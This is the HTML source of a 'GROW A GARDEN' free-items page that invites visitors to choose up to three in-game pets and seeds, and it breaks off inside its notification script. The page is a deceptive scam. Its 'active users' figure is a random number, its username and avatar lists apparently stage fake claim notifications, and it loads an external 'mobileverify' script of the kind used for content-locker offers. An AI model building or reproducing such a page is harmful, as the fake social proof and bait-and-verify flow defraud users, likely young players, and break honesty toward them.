<html lang="en" dir="ltr">

<head>
    <script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "ssrphlj0m0");
</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GROW A GARDEN</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-EPFW29NPW8"></script>
    

    <style>
        /* ==== SPACE BACKGROUND ==== */
        .space-background { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            z-index: -1; 
            overflow: hidden;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 25%, #16213e 50%, #0e1538 75%, #000000 100%);
        }
        .star { 
            position: absolute; 
            background: #fff; 
            border-radius: 50%; 
            animation: twinkle 3s infinite ease-in-out; 
        }
        .star.small { width: 2px; height: 2px; animation-duration: 2s; }
        .star.medium { width: 3px; height: 3px; animation-duration: 3s; box-shadow: 0 0 6px #fff; }
        .star.large { width: 4px; height: 4px; animation-duration: 4s; box-shadow: 0 0 10px #fff, 0 0 20px #fff; }
        @keyframes twinkle { 
            0%,100%{opacity:.3;transform:scale(1);}
            50%{opacity:1;transform:scale(1.2);} 
        }
        
        .shooting-star { 
            position: absolute; 
            width: 2px; 
            height: 2px; 
            background: #fff; 
            border-radius: 50%; 
            box-shadow: 0 0 10px #fff; 
            animation: shoot 3s linear infinite; 
            opacity: 0; 
        }
        .shooting-star::after { 
            content: ''; 
            position: absolute; 
            top: 0; 
            right: 0; 
            width: 100px; 
            height: 2px;
            background: linear-gradient(90deg, transparent, #fff, transparent); 
            border-radius: 50px; 
        }
        @keyframes shoot { 
            0%{transform:translateX(-100px) translateY(-100px);opacity:0;}
            10%{opacity:1;}
            90%{opacity:1;}
            100%{transform:translateX(100vw) translateY(100vh);opacity:0;} 
        }

        .cosmic-dust { 
            position: absolute; 
            border-radius: 50%; 
            animation: float-cosmic 20s infinite linear; 
            opacity: 0; 
        }
        .cosmic-dust.purple { background: radial-gradient(circle, rgba(138, 43, 226, 0.6), transparent); }
        .cosmic-dust.blue { background: radial-gradient(circle, rgba(65, 105, 225, 0.6), transparent); }
        .cosmic-dust.pink { background: radial-gradient(circle, rgba(255, 20, 147, 0.6), transparent); }
        @keyframes float-cosmic { 
            0%{transform:translateY(100vh)translateX(0)rotate(0);opacity:0;}
            10%,90%{opacity:0.7;}
            100%{transform:translateY(-10vh)translateX(50px)rotate(360deg);opacity:0;} 
        }

        .planet { 
            position: absolute; 
            border-radius: 50%; 
            animation: orbit 30s infinite linear; 
        }
        .planet.small { width: 20px; height: 20px; background: radial-gradient(circle at 30% 30%, #ff6b6b, #d63031); box-shadow: 0 0 20px rgba(214, 48, 49, 0.5); }
        .planet.medium { width: 35px; height: 35px; background: radial-gradient(circle at 30% 30%, #74b9ff, #0984e3); box-shadow: 0 0 30px rgba(9, 132, 227, 0.5); }
        .planet.large { width: 50px; height: 50px; background: radial-gradient(circle at 30% 30%, #fd79a8, #e84393); box-shadow: 0 0 40px rgba(232, 67, 147, 0.5); }
        @keyframes orbit { 
            0%{transform:rotate(0deg)translateX(200px)rotate(0deg);}
            100%{transform:rotate(360deg)translateX(200px)rotate(-360deg);} 
        }

        .nebula { 
            position: absolute; 
            border-radius: 50%; 
            filter: blur(3px); 
            animation: nebula-drift 25s infinite ease-in-out; 
            opacity: 0.3; 
        }
        .nebula.purple { background: radial-gradient(ellipse, rgba(138, 43, 226, 0.4), transparent); }
        .nebula.blue { background: radial-gradient(ellipse, rgba(65, 105, 225, 0.4), transparent); }
        .nebula.pink { background: radial-gradient(ellipse, rgba(255, 20, 147, 0.4), transparent); }
        @keyframes nebula-drift { 
            0%,100%{transform:translateX(0)translateY(0)scale(1);}
            25%{transform:translateX(50px)translateY(-30px)scale(1.1);}
            50%{transform:translateX(100px)translateY(20px)scale(0.9);}
            75%{transform:translateX(30px)translateY(50px)scale(1.05);} 
        }

        /* LTR Styles */
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            box-sizing: border-box;
            font-family: 'Cairo', Arial, sans-serif;
            position: relative;
            overflow-x: hidden;
            text-align: left;
            background: #000;
            padding-bottom: 100px;
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .logo-container {
            text-align: center;
            padding-top: 15px;
        }

        .logo-container img {
            max-width: 180px;
            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5));
        }

        .content {
            position: relative;
            z-index: 1;
        }

        .top-bar {
            width: 100vw;
            display: flex;
            flex-direction: row;
            justify-content: center;
            align-items: center;
            gap: 14px;
            box-sizing: border-box;
            padding: 16px 0 0 0;
            margin-bottom: 8px;
        }

        .active-users-box {
            background: #0066cc;
            border: 2.3px solid rgba(255,255,255,0.8);
            border-radius: 13px;
            padding: 13px 18px;
            display: flex;
            align-items: center;
            font-size: 1.5em;
            min-width: 220px;
            max-width: 70vw;
            margin: 0;
            box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.09);
            font-weight: 900;
            font-family: 'Cairo', Arial, sans-serif;
            height: 54px;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.17s cubic-bezier(.17, .67, .83, .67);
            will-change: transform;
            position: relative;
            overflow: hidden;
        }

        .active-users-box:after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        .active-users-box:hover:after {
            left: 100%;
        }

        .active-users-box:active {
            transform: scale(1.09) rotate(-2deg);
            box-shadow: 0 0 0 6px #fff5, 0 2px 6px #0003;
            z-index: 2;
            filter: brightness(1.08);
            background: #0055aa;
        }

        .active-users-box span:first-child {
            color: #fff;
            margin-right: 8px;
            font-weight: 900;
            font-size: 1.1em;
            letter-spacing: 1px;
        }

        .active-users-count {
            font-weight: 900;
            font-family: 'Orbitron', 'Cairo', Arial, sans-serif;
            margin-left: 8px;
            font-size: 1.15em;
            color: #FFD700;
            text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
        }

        .select-title {
            margin: 30px 0 10px 0;
            text-align: center;
            font-size: 1.7em;
            color: #fff;
            font-family: 'Cairo', Arial, sans-serif;
            letter-spacing: .4px;
            font-weight: 900;
            text-shadow: 0 1px 5px rgba(0,0,0,0.8);
            padding: 8px 0;
            position: relative;
        }

        .select-title:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 25%;
            width: 50%;
            height: 3px;
            background: linear-gradient(to right, transparent, #ffd700, transparent);
        }

        .items-grid {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 26px;
            margin-bottom: 20px;
            width: 100%;
            box-sizing: border-box;
        }

        .items-row {
            display: flex;
            gap: 22px;
            width: 100%;
            justify-content: center;
            box-sizing: border-box;
        }

        .item-card {
            background: rgba(255,255,255,0.95);
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            padding: 10px 8px 8px 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 170px;
            min-width: 100px;
            max-width: 31vw;
            border: 2px solid #eee;
            margin: 0;
            position: relative;
            cursor: pointer;
            transition: all 0.3s ease;
            will-change: transform;
            overflow: hidden;
        }

        .item-card:before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
            opacity: 0;
            transition: opacity 0.3s;
        }

        .item-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
        }

        .item-card:active {
            transform: scale(1.09) rotate(-2deg);
            box-shadow: 0 0 0 6px #ffd70033, 0 2px 12px #0003;
            z-index: 2;
            filter: brightness(1.08);
        }

        .item-card.selected {
            background: linear-gradient(135deg, #ffd700, #ffbf00);
            border: 2px solid #d4af37;
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
            animation: goldenGlow 1.5s infinite alternate;
        }

        @keyframes goldenGlow {
            from {
                box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
            }
            to {
                box-shadow: 0 0 25px rgba(255, 215, 0, 0.9);
            }
        }

        .item-img {
            width: 110px;
            height: 110px;
            object-fit: cover;
            border-radius: 8px;
            background: #eaeaea;
            margin-bottom: 10px;
            border: none;
            image-rendering: pixelated;
            box-shadow: 0 0 13px rgba(0,0,0,0.1);
            transition: box-shadow 0.12s, filter 0.12s;
            display: block;
            position: relative;
            z-index: 1;
        }

        .item-card.selected .item-img {
            box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
            filter: brightness(1.05) contrast(1.1);
        }

        .item-name {
            font-size: 1.08em;
            color: #333;
            font-family: 'Cairo', Arial, sans-serif;
            text-align: center;
            font-weight: 900;
            letter-spacing: .2px;
            margin-bottom: 0;
            line-height: 1.2;
            width: 100%;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis;
            background: none;
            border-radius: 0;
            border: none;
            margin-top: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            box-sizing: border-box;
            min-height: 28px;
            position: relative;
            z-index: 1;
        }

        .item-card.selected .item-name {
            color: #8b7500;
            text-shadow: 0 0 2px rgba(255, 215, 0, 0.5);
        }

        /* START: Styles for Controls (Button & Message) */
        .selection-controls {
            text-align: center;
            padding: 5px 0 20px 0;
            min-height: 25px;
        }

        #continue-btn {
            display: none;
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1001;
            padding: 15px 40px;
            font-size: 1.4em;
            font-weight: 900;
            font-family: 'Cairo', Arial, sans-serif;
            color: white;
            background: #333333;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        #continue-btn:hover {
            background: #444444;
            transform: translateX(-50%) translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
        }

        #continue-btn:active {
            background: #222222;
            transform: translateX(-50%) translateY(1px);
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
        }

        #selection-limit-message {
            display: none;
            color: #ff4d4d;
            font-weight: bold;
            font-size: 1em;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
        }

        /* END: Styles for Controls */
        .cliameds {
            position: fixed;
            bottom: 65px;
            left: 15px;
            z-index: 9999;
        }

        .message {
            background-color: rgba(135, 206, 250, 0.85);
            display: flex;
            font-size: .8rem;
            align-items: center;
            padding: 10px 20px;
            border-radius: 6px;
            border: 2px solid rgba(238, 204, 159, 0.7);
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .message:after {
            content: '';
            position: absolute;
            top: -50%;
            left: -60%;
            width: 20%;
            height: 200%;
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(30deg);
            transition: all 0.5s;
        }

        .message:hover:after {
            left: 120%;
        }

        .message .img {
            padding-right: 10px;
            z-index: 2;
        }

        .message .img img {
            width: 50px;
            background: #fff;
            border-radius: 50%;
            height: 50px;
            border: 2px solid #fff;
            box-shadow: 0 0 8px rgba(0, 0, 0, 0.3);
        }

        .message .more {
            z-index: 2;
        }

        .message .more div:first-child {
            font-weight: bold;
            color: #0066cc;
        }

        .message .more div:last-child {
            color: #333;
            font-weight: 700;
        }

        @media (min-width: 800px) {
            .cliameds {
                bottom: 10px;
            }
        }

        @media (min-width: 901px) {
            .items-grid {
                display: grid;
                grid-template-columns: repeat(5, 1fr);
                gap: 20px;
                justify-content: center;
                padding: 0 5%;
            }
            .items-row {
                display: contents;
            }
            .item-card {
                width: 100%;
                max-width: 180px;
                margin: 0 auto;
            }
        }

        @media (max-width: 900px) {
            .items-grid {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 26px;
            }
            .items-row {
                display: flex;
                gap: 22px;
                width: 100%;
                justify-content: center;
            }
            .active-users-box {
                font-size: 1.1em;
                min-width: 145px;
                padding: 9px 8px;
                height: 38px;
            }
            .select-title {
                font-size: 1.1em;
            }
            .items-row {
                gap: 10px;
            }
            .item-card {
                width: 31vw;
                min-width: 0;
                max-width: 32vw;
                padding: 8px 2px 6px 2px;
            }
            .item-img {
                width: 80px;
                height: 80px;
            }
            .item-name {
                min-height: 22px;
                font-size: 0.95em;
            }
        }

        @media (max-width: 700px) {
            .items-grid {
                gap: 5vw;
            }
            .items-row {
                gap: 5vw;
            }
            .item-card {
                width: 29vw;
                max-width: 33vw;
                min-width: 0;
                padding: 5vw 1vw 2vw 1vw;
            }
            .item-img {
                width: 24vw;
                height: 24vw;
                min-width: 62px;
                min-height: 62px;
                max-width: 110px;
                max-height: 110px;
            }
            .item-name {
                font-size: 0.92em;
                min-height: 20px;
            }
        }

        @media (max-width: 500px) {
            .items-row {
                gap: 2vw;
            }
            .item-card {
                width: 30vw;
                max-width: 33vw;
                min-width: 0;
                padding: 2vw 0.5vw 2vw 0.5vw;
            }
            .item-img {
                width: 26vw;
                height: 26vw;
                min-width: 54px;
                min-height: 54px;
                max-width: 96px;
                max-height: 96px;
            }
            .item-name {
                font-size: 0.89em;
                min-height: 16px;
            }
            .logo-container img {
                max-width: 140px;
            }
            .cliameds {
                left: 5px;
            }
        }

        @media (max-width: 900px) {
            .items-row {
                flex-direction: row;
                justify-content: center;
                width: 100%;
            }
            .item-card {
                margin-bottom: 0;
            }
        }

        @media (max-width: 600px) {
            .items-row {
                flex-direction: row;
                justify-content: center;
                width: 100%;
            }
            .item-card {
                margin-bottom: 0;
            }
            .top-bar {
                padding-top: 9px;
            }
        }

        /* Purchase popup styles */
        .purchase-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .popup-content {
            background-color: #333;
            padding: 25px;
            border-radius: 10px;
            width: 90%;
            max-width: 380px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            text-align: center;
            color: white;
            margin: auto;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .popup-header {
            position: relative;
            padding-bottom: 20px;
            margin-bottom: 15px;
        }

        .popup-header h3 {
            font-size: 24px;
            margin: 0;
            color: white;
            font-weight: 700;
        }

        .popup-header:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 10%;
            right: 10%;
            height: 3px;
            background-color: #666;
        }

        /* START: Styles for Popup Images */
        .selected-images-container {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin: 15px auto;
        }

        .item-popup-image-small {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            object-fit: cover;
            border: 2px solid #444;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        /* END: Styles for Popup Images */
        .item-confirm {
            font-size: 18px;
            margin: 0.3cm 0;
            color: white;
            font-weight: 700;
            line-height: 1.4;
        }

        .input-group {
            margin-bottom: 25px;
            text-align: left;
        }

        .input-group label {
            display: none;
        }

        .input-group input {
            width: 92%;
            padding: 15px 12px;
            background-color: white;
            color: #333;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 15px;
            font-weight: 600;
        }

        .input-group input::placeholder {
            color: #999;
            font-weight: 700;
        }

        .popup-buttons {
            display: flex;
            justify-content: space-between;
            gap: 12px;
        }

        .cancel-btn {
            background-color: #555;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            flex: 1;
            font-size: 15px;
        }

        .free-btn {
            background-color: white;
            border: none;
            padding: 12px;
            border-radius: 5px;
            cursor: pointer;
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 6px;
        }

        .free-btn .free-badge {
            color: #333;
            font-weight: 900;
            display: flex;
            align-items: center;
            font-size: 15px;
        }

        .free-btn .free-icon {
            width: 20px;
            height: 20px;
            background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
            background-size: contain;
            background-repeat: no-repeat;
        }

        /* Searching state styles */
        .searching-container {
            text-align: center;
            padding: 20px;
        }

        .folding {
            margin: 20px auto;
            width: 70px;
            height: 70px;
            position: relative;
            transform: rotateZ(45deg);
        }

        .square {
            position: absolute;
            top: 30%;
            right: 30%;
            width: 30px;
            height: 30px;
            background-color: #000;
            transform: rotateZ(87deg);
        }

        .folding .sk-cube {
            float: left;
            width: 50%;
            height: 50%;
            position: relative;
            transform: scale(1.1);
        }

        .folding .sk-cube:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            animation: sk-foldCubeAngle 2.4s infinite linear both;
            transform-origin: 100% 100%;
        }

        .folding .sk-cube2 {
            transform: scale(1.1) rotateZ(90deg);
        }

        .folding .sk-cube3 {
            transform: scale(1.1) rotateZ(180deg);
        }

        .folding .sk-cube4 {
            transform: scale(1.1) rotateZ(270deg);
        }

        .folding .sk-cube2:before {
            animation-delay: 0.3s;
        }

        .folding .sk-cube3:before {
            animation-delay: 0.6s;
        }

        .folding .sk-cube4:before {
            animation-delay: 0.9s;
        }

        @keyframes sk-foldCubeAngle {
            0%,
            10% {
                transform: perspective(140px) rotateX(-180deg);
                opacity: 0;
            }
            25%,
            75% {
                transform: perspective(140px) rotateX(0deg);
                opacity: 1;
            }
            90%,
            100% {
                transform: perspective(140px) rotateY(180deg);
                opacity: 0;
            }
        }

        .searching-text {
            color: white;
            font-size: 18px;
            margin-top: 20px;
        }

        /* Success state styles */
        .result-avatar {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            object-fit: cover;
            margin: 15px auto;
            border: 3px solid #444;
        }

        .result-username {
            color: white;
            font-size: 18px;
            font-weight: bold;
            margin: 15px 0;
        }

        .get-item-now-btn {
            background-color: white;
            color: #333;
            border: none;
            padding: 12px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 15px;
            transition: all 0.3s;
        }

        .get-item-now-btn:hover {
            background-color: #f0f0f0;
        }

        .d-none {
            display: none !important;
        }

        .user-error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 5px;
            text-align: center;
        }

        /* Mobile only adjustments */
        @media (max-width: 480px) {
            .item-popup-image-small {
                width: 60px;
                height: 60px;
            }
            .popup-header:after {
                left: 5%;
                right: 5%;
                height: 3px;
            }
            .popup-content {
                width: 90%;
                max-width: 300px;
                padding: 15px;
            }
        }
    </style>
   
</head>

<body>
    <!-- Space background -->
    <div class="space-background" id="spaceBg"></div>

    <div class="logo-container">
        <img src="https://growgarden.dev/logo2.webp" alt="GROW A GARDEN Logo" border="0">
    </div>
    <div class="content">
        <div class="top-bar">
            <div class="active-users-box">
                <span>Active users :</span>
                <span class="active-users-count" id="activeUsersCount"></span>
            </div>
        </div>
        <div class="select-title">
            SELECT UP TO 3 ITEMS YOU WISH TO GET
        </div>

        <div class="selection-controls">
            <div id="selection-limit-message">You can only select up to 3 items.</div>
        </div>

        <div class="items-grid" id="itemsGrid">
            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/ancient.webp" alt="ancient">
                    <div class="item-name">Ancient pack </div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/S7NCYqSm/Dragon-Pepper-Icon.webp" alt="Dragon-Pepper">
                    <div class="item-name"> Dragon Pepper</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/boneblossom.webp" alt="boneblossom">
                    <div class="item-name"> Bone blossom</div>
                </div>
            </div>

            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://growpets.pages.dev/pets/mimic.webp" alt="Mimic Octopus">
                    <div class="item-name">Mimic Octopus</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growpets.pages.dev/pets/Brontosaurus.webp" alt="Brontosaurus-Icon ">
                    <div class="item-name">Brontosaurus</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growpets.pages.dev/pets/trex.webp" alt="T-Rex-Dinosaur-Icon ">
                    <div class="item-name">T-Rex Dinosaur</div>
                </div>
            </div>

            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/Y4B0XkDv/Super-Seed-Icon.webp" alt="Super-Seed">
                    <div class="item-name"> Super-Seed</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/BHPJxK34/Candy-Blossom-Pic.webp" alt="Candy-Blossom">
                    <div class="item-name"> Candy-Blossom</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/dinoegg.webp" alt="dinoegg">
                    <div class="item-name"> ×15 Dinosaur egg</div>
                </div>
            </div>

            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/zV53BFhQ/Dragonfruitthumb.webp" alt="Dragon fruit">
                    <div class="item-name">Dragon fruit</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/9kbsYCMB/Rainbow-Sack-Pack.webp" alt="Rainbow-Sack-Pack">
                    <div class="item-name"> ×15 Rainbow-Sack</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/YBKP5Kzm/Raccon-Better-Quality.webp" alt="Raccon-Better-Quality">
                    <div class="item-name"> Raccon</div>
                </div>
            </div>
            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/dinobird.webp" alt="pterodactyl">
                    <div class="item-name">Pterodactyl</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/PG58ScrY/Elephant-Ears-Produce.webp" alt="Elephant-Ears-Produce">
                    <div class="item-name">Elephant-Ears</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/ember.webp" alt="Ember Lily">
                    <div class="item-name">Ember Lily </div>
                </div>
            </div>
            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/trex.webp" alt="T-REX DINASAUR">
                    <div class="item-name">T-rex Dinosaur</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growgarden.dev/pets/disco.webp" alt="Disco Bee">
                    <div class="item-name">Disco Bee</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/rf5KdgnM/Master-Sprinkler.webp" alt="Master-Sprinkler">
                    <div class="item-name">Master-Sprinkler</div>
                </div>
            </div>
            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/0Vfk0VGn/Sunflower-Plant-Icon.webp" alt="Sunflower-Plant-Icon ">
                    <div class="item-name">Sunflower</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/N69j6J0y/Bearbeee1.webp" alt="Bearbeee1" border="0">
                    <div class="item-name">Bear-bee</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/mC7N04VB/Moon-Mango-Icon.webp" alt="Moon-Mango-Icon">
                    <div class="item-name">Moon-Mango</div>
                </div>
            </div>
            <div class="items-row">
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/x8P1VQGV/Stegosaurus.webp" alt="Stegosaurus">
                    <div class="item-name">Stegosaurus</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://i.ibb.co/Jj90fCfD/Sugar-Apple-Icon.webp" alt="Sugar-Apple-Icon ">
                    <div class="item-name">Sugar-Apple</div>
                </div>
                <div class="item-card">
                    <img class="item-img" src="https://growpets.pages.dev/pets/dragonfly.webp" alt="Dragonfly-Pet-Icon ">
                    <div class="item-name">Dragonfly Pet</div>
                </div>
            </div>
        </div>
        <button id="continue-btn">Continue</button>
    </div>
    <div class="cliameds"></div>
    <div class="purchase-popup" id="purchase-popup">
        <div class="popup-content">
        </div>
    </div>
    <audio id="dingSound" preload="auto">
        <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
    </audio>
    <audio id="clickSound" preload="auto">
        <source src="https://cdn.pixabay.com/audio/2022/03/10/audio_63c49c13c8.mp3" type="audio/mpeg">
    </audio>
    <script type="text/javascript" id="ogjs" src="https://mobileverify.net/cl/js/dv6g5o"></script>

    <script>
        // Space Background Class
        class SpaceBackground {
            constructor() { 
                this.container = document.getElementById('spaceBg'); 
                this.init(); 
            }
            init() { 
                this.createStars(); 
                this.createShootingStars(); 
                this.createCosmicDust(); 
                this.createPlanets(); 
                this.createNebulae(); 
                this.createSpaceParticles(); 
                this.createEnergyWaves(); 
                this.createGalaxies(); 
            }
            createStars() { 
                for(let i=0;i<200;i++){
                    const s=document.createElement('div');
                    s.className=`star ${this.randomSize()}`;
                    s.style.left=Math.random()*100+'%';
                    s.style.top=Math.random()*100+'%';
                    s.style.animationDelay=Math.random()*3+'s';
                    this.container.appendChild(s);
                } 
            }
            createShootingStars() { 
                setInterval(()=>{
                    if(Math.random()<0.7){
                        const st=document.createElement('div');
                        st.className='shooting-star';
                        st.style.left=Math.random()*100+'%';
                        st.style.top=Math.random()*50+'%';
                        this.container.appendChild(st);
                        setTimeout(()=>{st.remove();},3000);
                    }
                },2000); 
            }
            createCosmicDust() { 
                for(let i=0;i<30;i++){
                    const d=document.createElement('div');
                    const c=['purple','blue','pink'];
                    d.className=`cosmic-dust ${c[Math.floor(Math.random()*c.length)]}`;
                    d.style.width=(5+Math.random()*15)+'px';
                    d.style.height=d.style.width;
                    d.style.left=Math.random()*100+'%';
                    d.style.animationDelay=Math.random()*20+'s';
                    d.style.animationDuration=(15+Math.random()*10)+'s';
                    this.container.appendChild(d);
                } 
            }
            createPlanets() { 
                for(let i=0;i<3;i++){
                    const p=document.createElement('div');
                    p.className=`planet ${this.randomSize()}`;
                    p.style.left=(20+Math.random()*60)+'%';
                    p.style.top=(20+Math.random()*60)+'%';
                    p.style.animationDelay=Math.random()*30+'s';
                    p.style.animationDuration=(25+Math.random()*20)+'s';
                    this.container.appendChild(p);
                } 
            }
            createNebulae() { 
                for(let i=0;i<5;i++){
                    const n=document.createElement('div');
                    const c=['purple','blue','pink'];
                    n.className=`nebula ${c[Math.floor(Math.random()*c.length)]}`;
                    n.style.width=(100+Math.random()*200)+'px';
                    n.style.height=(80+Math.random()*150)+'px';
                    n.style.left=Math.random()*100+'%';
                    n.style.top=Math.random()*100+'%';
                    n.style.animationDelay=Math.random()*25+'s';
                    this.container.appendChild(n);
                } 
            }
            createSpaceParticles() { 
                setInterval(()=>{
                    const p=document.createElement('div');
                    p.className='space-particle';
                    p.style.width=(2+Math.random()*3)+'px';
                    p.style.height=p.style.width;
                    p.style.left='-10px';
                    p.style.top=Math.random()*100+'%';
                    p.style.animationDuration=(10+Math.random()*10)+'s';
                    this.container.appendChild(p);
                    setTimeout(()=>p.remove(),20000);
                },1000); 
            }
            createEnergyWaves() { 
                setInterval(()=>{
                    if(Math.random()<0.3){
                        const w=document.createElement('div');
                        w.className='energy-wave';
                        w.style.top=Math.random()*100+'%';
                        w.style.width=(200+Math.random()*400)+'px';
                        w.style.animationDuration=(6+Math.random()*4)+'s';
                        this.container.appendChild(w);
                        setTimeout(()=>w.remove(),10000);
                    }
                },3000); 
            }
            createGalaxies() { 
                for(let i=0;i<3;i++){
                    const g=document.createElement('div');
                    g.className='galaxy';
                    g.style.left=Math.random()*100+'%';
                    g.style.top=Math.random()*100+'%';
                    g.style.animationDelay=Math.random()*40+'s';
                    this.container.appendChild(g);
                } 
            }
            randomSize() { 
                const s=['small','medium','large'];
                return s[Math.floor(Math.random()*s.length)]; 
            }
        }

        // Initialize space background when DOM is loaded
        document.addEventListener('DOMContentLoaded',()=>{new SpaceBackground();});

        // Function to generate random number between 90 and 900
        function randomUsers() {
            return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
        }

        function updateActiveUsers() {
            document.getElementById('activeUsersCount').textContent = randomUsers();
        }
        updateActiveUsers();
        setInterval(updateActiveUsers, 4500);

        // Notifications code
        const avatars = [
            'https://dress2.pages.dev/avatars/avatar1.png', 'https://dress2.pages.dev/avatars/avatar2.png', 'https://dress2.pages.dev/avatars/avatar3.png', 'https://dress2.pages.dev/avatars/avatar4.png', 'https://dress2.pages.dev/avatars/avatar5.png', 'https://dress2.pages.dev/avatars/avatar6.png', 'https://dress2.pages.dev/avatars/avatar7.png', 'https://dress2.pages.dev/avatars/avatar8.png', 'https://dress2.pages.dev/avatars/avatar9.png', 'https://dress2.pages.dev/avatars/avatar10.png'
        ];
        const items = [
            'Super-Seed', 'Night-Egg', 'Candy-Blossom', 'Queen-bee', 'Dragonfly', 'Golden Lab ', ' Flower-Seed ', ' Dragon fruit', 'Mango', ' Grapwes', 'Mushroom', 'Star-Caller', 'Master-Sprinkler', 'Favorite-Tool', 'Harvest-tool', 'Honey-Sprinkler', 'Pepper', 'Cacao', 'Beanstalk',
        ];
        const usernames = [
            'MADELYN2', 'zontir99', 'marcos10', 'Queen_lisa1', 'LANA11', 'HAMZA22', 'tbonmk2', 'caroline34', 'dimaraja10', 'asktiyal9hba', 'ronaldo7', 'sidi_binzarn1', 'DERKAOUI_ZAML1', 'Tizit.botsot', 'Achnid22'
        ];
        let notificationInterval;
        let popupOpen = false;

        function startNotifications() {
